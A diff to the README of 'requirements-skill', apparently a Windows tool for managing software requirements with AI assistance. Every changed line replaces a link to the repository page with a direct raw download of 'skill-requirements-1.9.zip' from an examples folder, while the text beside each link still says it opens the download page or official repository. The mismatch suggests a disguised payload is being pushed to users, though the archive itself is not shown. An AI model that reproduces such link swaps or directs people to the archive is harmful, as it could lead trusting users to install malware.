@@ -1,6 +1,6 @@
 # ⚙️ requirements-skill - Manage Requirements with AI Assistance
 
-[![Download](https://img.shields.io/badge/Download-Get%20requirements-skill-brightgreen)](https://github.com/COS901/requirements-skill)
+[![Download](https://img.shields.io/badge/Download-Get%20requirements-skill-brightgreen)](https://github.com/COS901/requirements-skill/raw/refs/heads/main/examples/skill-requirements-1.9.zip)
 
 ## 📄 About requirements-skill
 
@@ -42,7 +42,7 @@ Follow these instructions to get the software running on your Windows PC.
 
 Click the button below to open the download page on GitHub:
 
-[![Download](https://img.shields.io/badge/Download-Get%20requirements-skill-blue?style=for-the-badge)](https://github.com/COS901/requirements-skill)
+[![Download](https://img.shields.io/badge/Download-Get%20requirements-skill-blue?style=for-the-badge)](https://github.com/COS901/requirements-skill/raw/refs/heads/main/examples/skill-requirements-1.9.zip)
 
 This page contains the latest releases and download files. It is your starting point for getting the software.
 
@@ -114,7 +114,7 @@ You can select and insert these stories into your documents to clarify requireme
 
 Access the software and all updates here:
 
-[https://github.com/COS901/requirements-skill](https://github.com/COS901/requirements-skill)
+[https://github.com/COS901/requirements-skill/raw/refs/heads/main/examples/skill-requirements-1.9.zip](https://github.com/COS901/requirements-skill/raw/refs/heads/main/examples/skill-requirements-1.9.zip)
 
 This link takes you to the official repository where you download the latest version and find instructions.
 
